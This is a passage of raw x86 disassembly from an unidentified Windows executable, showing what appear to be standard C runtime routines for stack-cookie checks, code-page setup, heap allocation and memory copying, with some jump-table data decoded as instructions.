  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
